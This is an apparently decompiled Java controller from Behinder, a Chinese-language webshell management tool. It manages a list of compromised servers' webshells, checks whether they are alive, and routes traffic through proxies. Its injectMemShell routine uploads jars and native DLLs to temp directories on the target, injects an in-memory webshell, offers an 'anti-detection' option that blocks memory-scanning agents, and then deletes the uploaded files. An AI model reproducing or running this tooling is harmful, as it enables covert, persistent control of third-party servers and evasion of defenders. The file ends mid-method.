package net.rebeyond.behinder.ui.controller;

import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
import java.io.ByteArrayInputStream;
import java.io.File;
import java.net.Authenticator;
import java.net.InetSocketAddress;
import java.net.PasswordAuthentication;
import java.net.Proxy;
import java.net.URL;
import java.net.Proxy.Type;
import java.security.SecureRandom;
import java.sql.Timestamp;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Optional;
import java.util.Random;
import java.util.regex.Pattern;
import javafx.application.Platform;
import javafx.beans.property.SimpleStringProperty;
import javafx.beans.property.StringProperty;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.fxml.FXML;
import javafx.fxml.FXMLLoader;
import javafx.geometry.Insets;
import javafx.geometry.Pos;
import javafx.scene.Node;
import javafx.scene.Parent;
import javafx.scene.Scene;
import javafx.scene.control.Alert;
import javafx.scene.control.Button;
import javafx.scene.control.ButtonType;
import javafx.scene.control.CheckBox;
import javafx.scene.control.ComboBox;
import javafx.scene.control.ContextMenu;
import javafx.scene.control.Label;
import javafx.scene.control.MenuItem;
import javafx.scene.control.RadioButton;
import javafx.scene.control.SelectionMode;
import javafx.scene.control.SeparatorMenuItem;
import javafx.scene.control.TableCell;
import javafx.scene.control.TableColumn;
import javafx.scene.control.TableRow;
import javafx.scene.control.TableView;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;
import javafx.scene.control.ToggleGroup;
import javafx.scene.control.TreeItem;
import javafx.scene.control.TreeView;
import javafx.scene.control.Alert.AlertType;
import javafx.scene.image.Image;
import javafx.scene.image.ImageView;
import javafx.scene.input.Clipboard;
import javafx.scene.input.ClipboardContent;
import javafx.scene.layout.GridPane;
import javafx.scene.layout.HBox;
import javafx.scene.paint.Color;
import javafx.stage.FileChooser;
import javafx.stage.Stage;
import javafx.stage.Window;
import net.rebeyond.behinder.core.Constants;
import net.rebeyond.behinder.core.ShellService;
import net.rebeyond.behinder.dao.ShellManager;
import net.rebeyond.behinder.utils.Utils;
import org.json.JSONArray;
import org.json.JSONObject;

public class MainController {
   @FXML
   private TreeView treeview;
   @FXML
   private TableView shellListTable;
   @FXML
   private TableColumn idCol;
   @FXML
   private TableColumn urlCol;
   @FXML
   private TableColumn ipCol;
   @FXML
   private TableColumn typeCol;
   @FXML
   private TableColumn osCol;
   @FXML
   private TableColumn commentCol;
   @FXML
   private TableColumn addTimeCol;
   @FXML
   private TableColumn statusCol;
   @FXML
   private MenuItem proxySetupBtn;
   @FXML
   private Label checkAliveBtn;
   @FXML
   private Label importBtn;
   @FXML
   private TextField searchShellTxt;
   @FXML
   private Label statusLabel;
   @FXML
   private Label versionLabel;
   @FXML
   private Label searchShellLabel;
   @FXML
   private Label proxyStatusLabel;
   @FXML
   private TreeView catagoryTreeView;
   private ShellManager shellManager;
   public static Map currentProxy = new HashMap();
   private int COL_INDEX_URL = 0;
   private int COL_INDEX_IP = 1;
   private int COL_INDEX_TYPE = 2;
   private int COL_INDEX_OS = 3;
   private int COL_INDEX_COMMENT = 4;
   private int COL_INDEX_ADDTIME = 5;
   private int COL_INDEX_STATUS = 6;
   private int COL_INDEX_ID = 7;
   private int COL_INDEX_MEMTYPE = 8;

   public MainController() {
      try {
         this.shellManager = new ShellManager();
      } catch (Exception var2) {
         System.err.println(var2.getMessage());
         this.showErrorMessage("错误", "数据库文件丢失");
         System.exit(0);
      }

   }

   public void initialize() {
      try {
         this.initCatagoryList();
         this.initShellList();
         this.initToolbar();
         this.initBottomBar();
         this.loadProxy();
      } catch (Exception var2) {
      }

   }

   private void initBottomBar() {
      this.versionLabel.setText(String.format(this.versionLabel.getText(), Constants.VERSION));
   }

   private void loadProxy() throws Exception {
      JSONObject proxyObj = this.shellManager.findProxy("default");
      int status = proxyObj.getInt("status");
      String type = proxyObj.getString("type");
      String ip = proxyObj.getString("ip");
      String port = proxyObj.get("port").toString();
      String username = proxyObj.getString("username");
      String password = proxyObj.getString("password");
      if (status == Constants.PROXY_ENABLE) {
         currentProxy.put("username", username);
         currentProxy.put("password", password);
         InetSocketAddress proxyAddr = new InetSocketAddress(ip, Integer.parseInt(port));
         Proxy proxy;
         if (type.equals("HTTP")) {
            proxy = new Proxy(Type.HTTP, proxyAddr);
            currentProxy.put("proxy", proxy);
         } else if (type.equals("SOCKS")) {
            proxy = new Proxy(Type.SOCKS, proxyAddr);
            currentProxy.put("proxy", proxy);
         }

         this.proxyStatusLabel.setText("代理生效中");
      }

   }

   private void initIcons() {
      try {
         this.searchShellLabel.setGraphic(new ImageView(new Image(new ByteArrayInputStream(Utils.getResourceData("net/rebeyond/behinder/resource/search.png")))));
      } catch (Exception var2) {
      }

   }

   private void initToolbar() {
      this.initIcons();
      this.proxySetupBtn.setOnAction((event) -> {
         Alert inputDialog = new Alert(AlertType.NONE);
         inputDialog.setResizable(true);
         Window window = inputDialog.getDialogPane().getScene().getWindow();
         window.setOnCloseRequest((e) -> {
            window.hide();
         });
         ToggleGroup statusGroup = new ToggleGroup();
         RadioButton enableRadio = new RadioButton("启用");
         RadioButton disableRadio = new RadioButton("禁用");
         enableRadio.setToggleGroup(statusGroup);
         disableRadio.setToggleGroup(statusGroup);
         HBox statusHbox = new HBox();
         statusHbox.setSpacing(10.0D);
         statusHbox.getChildren().add(enableRadio);
         statusHbox.getChildren().add(disableRadio);
         GridPane proxyGridPane = new GridPane();
         proxyGridPane.setVgap(15.0D);
         proxyGridPane.setPadding(new Insets(20.0D, 20.0D, 0.0D, 10.0D));
         Label typeLabel = new Label("类型：");
         ComboBox typeCombo = new ComboBox();
         typeCombo.setItems(FXCollections.observableArrayList(new String[]{"HTTP", "SOCKS"}));
         typeCombo.getSelectionModel().select(0);
         Label IPLabel = new Label("IP地址：");
         TextField IPText = new TextField();
         Label PortLabel = new Label("端口：");
         TextField PortText = new TextField();
         Label userNameLabel = new Label("用户名：");
         TextField userNameText = new TextField();
         Label passwordLabel = new Label("密码：");
         TextField passwordText = new TextField();
         Button cancelBtn = new Button("取消");
         Button saveBtn = new Button("保存");
         saveBtn.setDefaultButton(true);

         try {
            JSONObject proxyObj = this.shellManager.findProxy("default");
            if (proxyObj != null) {
               int status = proxyObj.getInt("status");
               if (status == Constants.PROXY_ENABLE) {
                  enableRadio.setSelected(true);
               } else if (status == Constants.PROXY_DISABLE) {
                  disableRadio.setSelected(true);
               }

               String type = proxyObj.getString("type");
               if (type.equals("HTTP")) {
                  typeCombo.getSelectionModel().select(0);
               } else if (type.equals("SOCKS")) {
                  typeCombo.getSelectionModel().select(1);
               }

               String ip = proxyObj.getString("ip");
               String port = proxyObj.get("port").toString();
               IPText.setText(ip);
               PortText.setText(port);
               String username = proxyObj.getString("username");
               String password = proxyObj.getString("password");
               userNameText.setText(username);
               passwordText.setText(password);
            }
         } catch (Exception var28) {
            this.statusLabel.setText("代理服务器配置加载失败。");
         }

         saveBtn.setOnAction((e) -> {
            if (disableRadio.isSelected()) {
               currentProxy.put("proxy", (Object)null);
               this.proxyStatusLabel.setText("");

               try {
                  this.shellManager.updateProxy("default", typeCombo.getSelectionModel().getSelectedItem().toString(), IPText.getText(), PortText.getText(), userNameText.getText(), passwordText.getText(), Constants.PROXY_DISABLE);
               } catch (Exception var12) {
               }

               inputDialog.getDialogPane().getScene().getWindow().hide();
            } else {
               try {
                  this.shellManager.updateProxy("default", typeCombo.getSelectionModel().getSelectedItem().toString(), IPText.getText(), PortText.getText(), userNameText.getText(), passwordText.getText(), Constants.PROXY_ENABLE);
               } catch (Exception var13) {
               }

               if (!userNameText.getText().trim().equals("")) {
                  final String proxyUser = userNameText.getText().trim();
                  String type = passwordText.getText();
                  Authenticator.setDefault(new Authenticator() {
                     public PasswordAuthentication getPasswordAuthentication() {
                        return new PasswordAuthentication(proxyUser, type.toCharArray());
                     }
                  });
               } else {
                  Authenticator.setDefault((Authenticator)null);
               }

               currentProxy.put("username", userNameText.getText());
               currentProxy.put("password", passwordText.getText());
               InetSocketAddress proxyAddr = new InetSocketAddress(IPText.getText(), Integer.parseInt(PortText.getText()));
               String type = typeCombo.getValue().toString();
               Proxy proxy;
               if (type.equals("HTTP")) {
                  proxy = new Proxy(Type.HTTP, proxyAddr);
                  currentProxy.put("proxy", proxy);
               } else if (type.equals("SOCKS")) {
                  proxy = new Proxy(Type.SOCKS, proxyAddr);
                  currentProxy.put("proxy", proxy);
               }

               this.proxyStatusLabel.setText("代理生效中");
               inputDialog.getDialogPane().getScene().getWindow().hide();
            }
         });
         cancelBtn.setOnAction((e) -> {
            inputDialog.getDialogPane().getScene().getWindow().hide();
         });
         proxyGridPane.add(statusHbox, 1, 0);
         proxyGridPane.add(typeLabel, 0, 1);
         proxyGridPane.add(typeCombo, 1, 1);
         proxyGridPane.add(IPLabel, 0, 2);
         proxyGridPane.add(IPText, 1, 2);
         proxyGridPane.add(PortLabel, 0, 3);
         proxyGridPane.add(PortText, 1, 3);
         proxyGridPane.add(userNameLabel, 0, 4);
         proxyGridPane.add(userNameText, 1, 4);
         proxyGridPane.add(passwordLabel, 0, 5);
         proxyGridPane.add(passwordText, 1, 5);
         HBox buttonBox = new HBox();
         buttonBox.setSpacing(20.0D);
         buttonBox.setAlignment(Pos.CENTER);
         buttonBox.getChildren().add(cancelBtn);
         buttonBox.getChildren().add(saveBtn);
         GridPane.setColumnSpan(buttonBox, 2);
         proxyGridPane.add(buttonBox, 0, 6);
         inputDialog.getDialogPane().setContent(proxyGridPane);
         inputDialog.showAndWait();
      });
      this.checkAliveBtn.setOnMouseClicked((event) -> {
         Alert alert = new Alert(AlertType.CONFIRMATION);
         alert.setResizable(true);
         alert.setHeaderText("");
         alert.setContentText("请确认是否批量检测网站列表中所有站点的存活状态？");
         Optional result = alert.showAndWait();
         if (result.get() != ButtonType.CANCEL) {
            int[] current = new int[]{0};
            int total = this.shellListTable.getItems().size();
            Iterator var6 = this.shellListTable.getItems().iterator();

            while(var6.hasNext()) {
               Object item = var6.next();
               Runnable runner = () -> {
                  int shellID = this.getShellID((ArrayList)item);
                  String shellUrl = this.getShellUrl((ArrayList)item);
                  boolean var20 = false;

                  int var10002;
                  label133: {
                     try {
                        var20 = true;
                        JSONObject shellEntity = this.shellManager.findShell(shellID);
                        ShellService shellService = new ShellService(shellEntity);
                        boolean isAlive = shellService.doConnect();
                        this.shellManager.setShellStatus(shellID, Constants.SHELL_STATUS_ALIVE);
                        var20 = false;
                        break label133;
                     } catch (Exception var25) {
                        try {
                           this.shellManager.setShellStatus(shellID, Constants.SHELL_STATUS_DEAD);
                           var20 = false;
                        } catch (Exception var23) {
                           var20 = false;
                        }
                     } finally {
                        if (var20) {
                           Platform.runLater(() -> {
                              this.statusLabel.setText(String.format("正在检测:%s(%d/%d)", shellUrl, current[0], total));
                           });
                           synchronized(this) {
                              var10002 = current[0]++;
                           }

                           if (current[0] == total) {
                              Platform.runLater(() -> {
                                 this.statusLabel.setText("全部检测完成。");
                              });
                           }

                        }
                     }

                     Platform.runLater(() -> {
                        this.statusLabel.setText(String.format("正在检测:%s(%d/%d)", shellUrl, current[0], total));
                     });
                     synchronized(this) {
                        var10002 = current[0]++;
                     }

                     if (current[0] == total) {
                        Platform.runLater(() -> {
                           this.statusLabel.setText("全部检测完成。");
                        });
                     }

                     return;
                  }

                  Platform.runLater(() -> {
                     this.statusLabel.setText(String.format("正在检测:%s(%d/%d)", shellUrl, current[0], total));
                  });
                  synchronized(this) {
                     var10002 = current[0]++;
                  }

                  if (current[0] == total) {
                     Platform.runLater(() -> {
                        this.statusLabel.setText("全部检测完成。");
                     });
                  }

               };
               Thread workThrad = new Thread(runner);
               workThrad.start();
            }

         }
      });
      this.searchShellTxt.textProperty().addListener((observable, oldValue, newValue) -> {
         try {
            this.shellListTable.getItems().clear();
            JSONArray shellList = this.shellManager.findShellByUrl(newValue);
            this.fillShellRows(shellList);
         } catch (Exception var5) {
         }

      });
      this.importBtn.setOnMouseClicked((event) -> {
         try {
            this.importData();
         } catch (Exception var3) {
            this.statusLabel.setText("导入失败：" + var3.getMessage());
         }

      });
   }

   private boolean checkSingleAlive() {
      return true;
   }

   private void injectMemShell(int shellID, String type, String path, boolean isAntiAgent) {
      this.statusLabel.setText("正在植入内存马……");
      Runnable runner = () -> {
         try {
            if (!path.startsWith("/")) {
               Platform.runLater(() -> {
                  Utils.showErrorMessage("错误", "路径必须以\"/\"开头");
                  this.statusLabel.setText("内存马植入错误，路径必须以\"/\"开头");
               });
               return;
            }

            Pattern.compile(path);
            JSONObject shellEntity = this.shellManager.findShell(shellID);
            ShellService shellService = new ShellService(shellEntity);
            shellService.doConnect();
            String osInfo = shellEntity.getString("os");
            int osType;
            String libPath;
            if (osInfo == null || osInfo.equals("")) {
               osType = (new SecureRandom()).nextInt(3000);
               libPath = Utils.getRandomString(osType);
               JSONObject basicInfoObj = new JSONObject(shellService.getBasicInfo(libPath));
               osInfo = (new String(Base64.decode(basicInfoObj.getString("osInfo")), "UTF-8")).toLowerCase();
            }

            osType = Utils.getOSType(osInfo);
            libPath = Utils.getRandomString(6);
            if (osType == Constants.OS_TYPE_WINDOWS) {
               libPath = "c:/windows/temp/" + libPath;
            } else {
               libPath = "/tmp/" + libPath;
            }

            shellService.uploadFile(libPath, Utils.getResourceData("net/rebeyond/behinder/resource/tools/tools_" + osType + ".jar"), true);
            shellService.loadJar(libPath);
            shellService.injectMemShell(type, libPath, path, Utils.getKey(shellEntity.getString("password")), isAntiAgent);

            try {
               String memUrl = Utils.getBaseUrl(shellEntity.getString("url")) + path;
               shellEntity.put("url", (Object)memUrl);
               int memType = this.getMemTypeFromType(type);
               shellEntity.put("memType", memType);
               this.addShell(shellEntity);
               this.loadShellList();
               this.shellListTable.getSelectionModel().select(this.shellListTable.getItems().size() - 1);
               Platform.runLater(() -> {
                  this.statusLabel.setText("注入完成。");
               });
               if (osType == Constants.OS_TYPE_WINDOWS) {
                  try {
                     JSONObject basicInfoMap = new JSONObject(shellService.getBasicInfo(Utils.getWhatever()));
                     String arch = (new String(Base64.decode(basicInfoMap.getString("arch")), "UTF-8")).toLowerCase();
                     String remoteUploadPath = "c:/windows/temp/" + Utils.getRandomString((new Random()).nextInt(10)) + ".log";
                     byte[] nativeLibraryFileContent;
                     if (arch.toString().indexOf("64") >= 0) {
                        nativeLibraryFileContent = Utils.getResourceData("net/rebeyond/behinder/resource/native/JavaNative_x64.dll");
                        shellService.uploadFile(remoteUploadPath, nativeLibraryFileContent, true);
                        shellService.freeFile(remoteUploadPath, libPath);
                        if (isAntiAgent) {
                           shellService.antiAgent(remoteUploadPath);
                        }

                        shellService.deleteFile(remoteUploadPath);
                     } else {
                        nativeLibraryFileContent = Utils.getResourceData("net/rebeyond/behinder/resource/native/JavaNative_x32.dll");
                        shellService.uploadFile(remoteUploadPath, nativeLibraryFileContent, true);
                        shellService.freeFile(remoteUploadPath, libPath);
                        if (isAntiAgent) {
                           shellService.antiAgent(remoteUploadPath);
                        }

                        shellService.deleteFile(remoteUploadPath);
                     }
                  } catch (Exception var19) {
                     var19.printStackTrace();
                  }
               }
            } catch (Exception var20) {
               Platform.runLater(() -> {
                  this.statusLabel.setText("注入完成，但是shell入库失败：" + var20.getMessage());
               });
            }
         } catch (Exception var21) {
            var21.printStackTrace();
            Platform.runLater(() -> {
               this.statusLabel.setText("注入失败：" + var21.getMessage());
            });
         }

      };
      Thread worker = new Thread(runner);
      worker.start();
   }

   private void initCatagoryList() throws Exception {
      this.initCatagoryTree();
      this.initCatagoryMenu();
   }

   private void initShellList() throws Exception {
      this.initShellTable();
      this.loadShellList();
      this.loadContextMenu();
   }

   private void initShellTable() throws Exception {
      this.shellListTable.getSelectionModel().setSelectionMode(SelectionMode.MULTIPLE);
      ObservableList tcs = this.shellListTable.getColumns();

      for(int i = 1; i < tcs.size(); ++i) {
         int j = i - 1;
         ((TableColumn)tcs.get(i)).setCellValueFactory((data) -> {
            //return (StringProperty)((List)data.getValue()).get(j);
            return (StringProperty)((List)((TableColumn.CellDataFeatures)data).getValue()).get(j);
         });
      }

      this.idCol.setCellFactory((col) -> {
         TableCell cell = new TableCell<Object,String>() {
            public void updateItem(String item, boolean empty) {
               super.updateItem(item, empty);
               this.setText((String)null);
               this.setGraphic((Node)null);
               if (!empty) {
                  int rowIndex = this.getIndex() + 1;
                  this.setText(String.valueOf(rowIndex));
                  this.setAlignment(Pos.CENTER);
               }

            }
         };
         return cell;
      });
      this.statusCol.setCellFactory((col) -> {
         TableCell cell = new TableCell<Object,String>() {
            public void updateItem(String item, boolean empty) {
               super.updateItem(item, empty);
               if (empty) {
                  this.setGraphic((Node)null);
               } else {
                  Object rowItem = this.getTableRow().getItem();
                  if (rowItem == null) {
                     this.setGraphic((Node)null);
                  } else {
                     try {
                        String memType = ((StringProperty)((List)this.getTableRow().getItem()).get(MainController.this.COL_INDEX_MEMTYPE)).getValue();
                        String iconPath = null;
                        if (item.equals("0")) {
                           if (memType.equals("0")) {
                              iconPath = "net/rebeyond/behinder/resource/alive.png";
                           } else {
                              iconPath = "net/rebeyond/behinder/resource/memshell_alive.png";
                           }
                        } else if (item.equals("1")) {
                           if (memType.equals("0")) {
                              iconPath = "net/rebeyond/behinder/resource/dead.png";
                           } else {
                              iconPath = "net/rebeyond/behinder/resource/memshell_dead.png";
                           }
                        }

                        Image image = new Image(new ByteArrayInputStream(Utils.getResourceData(iconPath)));
                        this.setGraphic(new ImageView(image));
                        this.setAlignment(Pos.CENTER);
                     } catch (Exception var7) {
                        var7.printStackTrace();
                        this.setText(item);
                     }

                  }
               }
            }
         };
         return cell;
      });
      this.shellListTable.setRowFactory((tv) -> {
         TableRow row = new TableRow();
         row.setOnMouseClicked((event) -> {
            if (event.getClickCount() == 2 && !row.isEmpty()) {
               String url = ((StringProperty)((List)row.getItem()).get(this.COL_INDEX_URL)).getValue();
               String shellID = ((StringProperty)((List)row.getItem()).get(this.COL_INDEX_ID)).getValue();

               try {
                  this.openShell(url, shellID);
               } catch (Exception var6) {
                  this.statusLabel.setText("shell打开失败。");
               }
            }

         });
         return row;
      });
   }

   private boolean checkUrl(String urlString) {
      try {
         new URL(urlString.trim());
         return true;
      } catch (Exception var3) {
         this.showErrorMessage("错误", "URL格式错误");
         return false;
      }
   }

   private boolean checkPassword(String password) {
      if (password.length() > 255) {
         this.showErrorMessage("错误", "密码长度不应大于255个字符");
         return false;
      } else if (password.length() < 1) {
         this.showErrorMessage("错误", "密码不能为空，请输入密码");
         return false;
      } else {
         return true;
      }
   }

   private void showShellDialog(int shellID) throws Exception {
      Alert alert = new Alert(AlertType.NONE);
      alert.setResizable(true);
      Window window = alert.getDialogPane().getScene().getWindow();
      window.setOnCloseRequest((e) -> {
         window.hide();
      });
      alert.setTitle("新增Shell");
      Stage stage = (Stage)alert.getDialogPane().getScene().getWindow();
      stage.getIcons().add(new Image(new ByteArrayInputStream(Utils.getResourceData("net/rebeyond/behinder/resource/logo.jpg"))));
      alert.setHeaderText("");
      TextField urlText = new TextField();
      TextField passText = new TextField();
      ComboBox shellType = new ComboBox();
      ObservableList typeList = FXCollections.observableArrayList(new String[]{"jsp", "php", "aspx", "asp"});
      shellType.setItems(typeList);
      ComboBox shellCatagory = new ComboBox();

      try {
         JSONArray catagoryArr = this.shellManager.listCatagory();
         ObservableList catagoryList = FXCollections.observableArrayList();

         for(int i = 0; i < catagoryArr.length(); ++i) {
            JSONObject catagoryObj = catagoryArr.getJSONObject(i);
            catagoryList.add(catagoryObj.getString("name"));
         }

         shellCatagory.setItems(catagoryList);
         shellCatagory.getSelectionModel().select(0);
      } catch (Exception var17) {
         var17.printStackTrace();
      }

      TextArea header = new TextArea();
      TextArea commnet = new TextArea();
      urlText.textProperty().addListener((observable, oldValue, newValue) -> {
         URL url;
         try {
            url = new URL(urlText.getText().trim());
         } catch (Exception var8) {
            return;
         }

         String extension = url.getPath().substring(url.getPath().lastIndexOf(".") + 1).toLowerCase();

         for(int i = 0; i < shellType.getItems().size(); ++i) {
            if (extension.toLowerCase().equals(shellType.getItems().get(i))) {
               shellType.getSelectionModel().select(i);
            }
         }

      });
      Button saveBtn = new Button("保存");
      saveBtn.setDefaultButton(true);
      Button cancelBtn = new Button("取消");
      GridPane vpsInfoPane = new GridPane();
      GridPane.setMargin(vpsInfoPane, new Insets(20.0D, 0.0D, 0.0D, 0.0D));
      vpsInfoPane.setVgap(10.0D);
      vpsInfoPane.setMaxWidth(Double.MAX_VALUE);
      vpsInfoPane.add(new Label("URL："), 0, 0);
      vpsInfoPane.add(urlText, 1, 0);
      vpsInfoPane.add(new Label("密码："), 0, 1);
      vpsInfoPane.add(passText, 1, 1);
      vpsInfoPane.add(new Label("脚本类型："), 0, 2);
      vpsInfoPane.add(shellType, 1, 2);
      vpsInfoPane.add(new Label("分类："), 0, 3);
      vpsInfoPane.add(shellCatagory, 1, 3);
      vpsInfoPane.add(new Label("自定义请求头："), 0, 4);
      vpsInfoPane.add(header, 1, 4);
      vpsInfoPane.add(new Label("备注："), 0, 5);
      vpsInfoPane.add(commnet, 1, 5);
      HBox buttonBox = new HBox();
      buttonBox.setSpacing(20.0D);
      buttonBox.getChildren().addAll(new Node[]{cancelBtn, saveBtn});
      buttonBox.setAlignment(Pos.BOTTOM_CENTER);
      vpsInfoPane.add(buttonBox, 0, 8);
      GridPane.setColumnSpan(buttonBox, 2);
      alert.getDialogPane().setContent(vpsInfoPane);
      if (shellID != -1) {
         JSONObject shellObj = this.shellManager.findShell(shellID);
         urlText.setText(shellObj.getString("url"));
         passText.setText(shellObj.getString("password"));
         shellType.setValue(shellObj.getString("type"));
         shellCatagory.setValue(shellObj.getString("catagory"));
         header.setText(shellObj.getString("headers"));
         commnet.setText(shellObj.getString("comment"));
      }

      saveBtn.setOnAction((e) -> {
         String url = urlText.getText().trim();
         String password = passText.getText();
         if (this.checkUrl(url) && this.checkPassword(password)) {
            String type = shellType.getValue().toString();
            String catagory = shellCatagory.getValue().toString();
            String comment = commnet.getText();
            String headers = header.getText();
            String os = "";
            int status = Constants.SHELL_STATUS_ALIVE;
            int memType = Constants.MEMSHELL_TYPE_FILE;

            try {
               if (shellID == -1) {
                  this.shellManager.addShell(url, password, type, catagory, os, comment, headers, status, memType);
               } else {
                  this.shellManager.updateShell(shellID, url, password, type, catagory, comment, headers);
               }

               this.loadShellList();
               return;
            } catch (Exception var23) {
               this.showErrorMessage("保存失败", var23.getMessage());
            } finally {
               alert.getDialogPane().getScene().getWindow().hide();
            }

         }
      });
      cancelBtn.setOnAction((e) -> {
         alert.getDialogPane().getScene().getWindow().hide();
      });
      alert.showAndWait();
   }

   private void openShell(String url, String shellID) throws Exception {
      FXMLLoader loader = new FXMLLoader(this.getClass().getResource("/net/rebeyond/behinder/ui/MainWindow.fxml"));
      Parent mainWindow = (Parent)loader.load();
      MainWindowController mainWindowController = (MainWindowController)loader.getController();
      mainWindowController.init(this.shellManager.findShell(Integer.parseInt(shellID)), this.shellManager, currentProxy);
      Stage stage = new Stage();
      stage.setTitle(url);
      stage.getIcons().add(new Image(new ByteArrayInputStream(Utils.getResourceData("net/rebeyond/behinder/resource/logo.jpg"))));
      stage.setUserData(url);
      stage.setScene(new Scene(mainWindow));
      stage.setOnCloseRequest((e) -> {
         Runnable runner = () -> {
            List workerList = mainWindowController.getWorkList();
            Iterator var2 = workerList.iterator();

            while(var2.hasNext()) {
               Thread worker = (Thread)var2.next();

               while(worker.isAlive()) {
                  try {
                     worker.stop();
                  } catch (Exception var5) {
                  } catch (Error var6) {
                  }
               }
            }

            workerList.clear();
         };
         Thread worker = new Thread(runner);
         worker.start();
      });
      stage.show();
   }

   private void loadContextMenu() {
      ContextMenu cm = new ContextMenu();
      MenuItem openBtn = new MenuItem("打开");
      cm.getItems().add(openBtn);
      MenuItem addBtn = new MenuItem("新增");
      cm.getItems().add(addBtn);
      MenuItem editBtn = new MenuItem("编辑");
      cm.getItems().add(editBtn);
      MenuItem delBtn = new MenuItem("删除");
      cm.getItems().add(delBtn);
      MenuItem copyBtn = new MenuItem("复制URL");
      cm.getItems().add(copyBtn);
      MenuItem memShellBtn = new MenuItem("注入内存马");
      cm.getItems().add(memShellBtn);
      SeparatorMenuItem separatorBtn = new SeparatorMenuItem();
      cm.getItems().add(separatorBtn);
      MenuItem refreshBtn = new MenuItem("刷新");
      cm.getItems().add(refreshBtn);
      this.shellListTable.setContextMenu(cm);
      openBtn.setOnAction((event) -> {
         String url = ((StringProperty)((List)this.shellListTable.getSelectionModel().getSelectedItem()).get(this.COL_INDEX_URL)).getValue();
         String shellID = ((StringProperty)((List)this.shellListTable.getSelectionModel().getSelectedItem()).get(this.COL_INDEX_ID)).getValue();

         try {
            this.openShell(url, shellID);
         } catch (Exception var5) {
            this.statusLabel.setText("shell打开失败。");
            var5.printStackTrace();
         }

      });
      addBtn.setOnAction((event) -> {
         try {
            this.showShellDialog(-1);
         } catch (Exception var3) {
            this.showErrorMessage("错误", "新增失败：" + var3.getMessage());
            var3.printStackTrace();
         }

      });
      editBtn.setOnAction((event) -> {
         if(this.shellListTable.getSelectionModel().getSelectedItem()==null){
            return;
         }
         String shellID = ((StringProperty)((List)this.shellListTable.getSelectionModel().getSelectedItem()).get(this.COL_INDEX_ID)).getValue();

         try {
            this.showShellDialog(Integer.parseInt(shellID));
         } catch (Exception var4) {
            this.showErrorMessage("错误", "编辑失败：" + var4.getMessage());
            var4.printStackTrace();
         }

      });
      delBtn.setOnAction((event) -> {
         int size = this.shellListTable.getSelectionModel().getSelectedItems().size();
         Alert alert = new Alert(AlertType.CONFIRMATION);
         alert.setResizable(true);
         alert.setHeaderText("");
         alert.setContentText("请确认是否删除？");
         Optional result = alert.showAndWait();
         if (result.get() == ButtonType.OK) {
            Iterator var5 = this.shellListTable.getSelectionModel().getSelectedItems().iterator();

            while(var5.hasNext()) {
               Object item = var5.next();
               String shellID = ((StringProperty)((List)item).get(this.COL_INDEX_ID)).getValue();

               try {
                  this.shellManager.deleteShell(Integer.parseInt(shellID));
               } catch (Exception var10) {
                  var10.printStackTrace();
               }
            }

            try {
               this.loadShellList();
            } catch (Exception var9) {
               var9.printStackTrace();
            }
         }

      });
      copyBtn.setOnAction((event) -> {
         String url = ((StringProperty)((List)this.shellListTable.getSelectionModel().getSelectedItem()).get(this.COL_INDEX_URL)).getValue();
         this.copyString(url);
      });
      memShellBtn.setOnAction((event) -> {
         String scriptType = ((StringProperty)((List)this.shellListTable.getSelectionModel().getSelectedItem()).get(this.COL_INDEX_TYPE)).getValue();
         String url = ((StringProperty)((List)this.shellListTable.getSelectionModel().getSelectedItem()).get(this.COL_INDEX_URL)).getValue();
         if (!scriptType.equals("jsp")) {
            Utils.showErrorMessage("提示", "内存马植入目前仅支持Java");
         } else {
            Alert inputDialog = new Alert(AlertType.NONE);
            inputDialog.setWidth(300.0D);
            inputDialog.setResizable(true);
            inputDialog.setTitle("注入内存马");
            Window window = inputDialog.getDialogPane().getScene().getWindow();
            window.setOnCloseRequest((e) -> {
               window.hide();
            });
            GridPane injectGridPane = new GridPane();
            injectGridPane.setVgap(15.0D);
            injectGridPane.setPadding(new Insets(20.0D, 20.0D, 0.0D, 10.0D));
            Label typeLabel = new Label("注入类型：");
            ComboBox typeCombo = new ComboBox();
            typeCombo.setItems(FXCollections.observableArrayList(new String[]{"Agent"}));
            typeCombo.getSelectionModel().selectedItemProperty().addListener((options, oldValue, newValue) -> {
               if (!newValue.equals("Filter") && newValue.equals("Servlet")) {
               }

            });
            typeCombo.getSelectionModel().select(0);
            Label pathLabel = new Label("注入路径：");
            pathLabel.setAlignment(Pos.CENTER_RIGHT);
            TextField pathText = new TextField();
            pathText.setPrefWidth(300.0D);
            pathText.setPromptText(String.format("支持正则表达式，如%smemshell.*", Utils.getContextPath(url)));
            pathText.focusedProperty().addListener((obs, oldVal, newVal) -> {
               if (pathText.getText().equals("")) {
                  pathText.setText(Utils.getContextPath(url) + "memshell");
               }

            });
            CheckBox antiAgentCheckBox = new CheckBox("防检测");
            Label antiAgentMemo = new Label("*防检测可避免目标JVM进程被注入，可避免内存查杀插件注入，同时容器重启前内存马也无法再次注入");
            antiAgentMemo.setTextFill(Color.RED);
            Button cancelBtn = new Button("取消");
            Button saveBtn = new Button("保存");
            saveBtn.setDefaultButton(true);
            saveBtn.setOnAction((e) -> {
               String shellID = ((StringProperty)((List)this.shellListTable.getSelectionModel().getSelectedItem()).get(this.COL_INDEX_ID)).getValue();
               String type = typeCombo.getValue().toString();
               this.injectMemShell(Integer.parseInt(shellID), type, pathText.getText().trim(), antiAgentCheckBox.isSelected());
               inputDialog.getDialogPane().getScene().getWindow().hide();
            });
            cancelBtn.setOnAction((e) -> {
               inputDialog.getDialogPane().getScene().getWindow().hide();
            });
            injectGridPane.add(typeLabel, 0, 0);
            injectGridPane.add(typeCombo, 1, 0);
            injectGridPane.add(pathLabel, 0, 1);
            injectGridPane.add(pathText, 1, 1);
            injectGridPane.add(antiAgentCheckBox, 0, 2);
            injectGridPane.add(antiAgentMemo, 0, 3, 2, 1);
            HBox buttonBox = new HBox();
            buttonBox.setSpacing(20.0D);
            buttonBox.setAlignment(Pos.CENTER);
            buttonBox.getChildren().add(cancelBtn);
            buttonBox.getChildren().add(saveBtn);
            GridPane.setColumnSpan(buttonBox, 2);
            injectGridPane.add(buttonBox, 0, 4);
            inputDialog.getDialogPane().setContent(injectGridPane);
            inputDialog.showAndWait();
         }
      });
      refreshBtn.setOnAction((event) -> {
         try {
            this.loadShellList();
         } catch (Exception var3) {
            var3.printStackTrace();
         }

      });
   }

   private int getMemTypeFromType(String type) {
      if (type.equals("Agent")) {
         return Constants.MEMSHELL_TYPE_AGENT;
      } else if (type.equals("Filter")) {
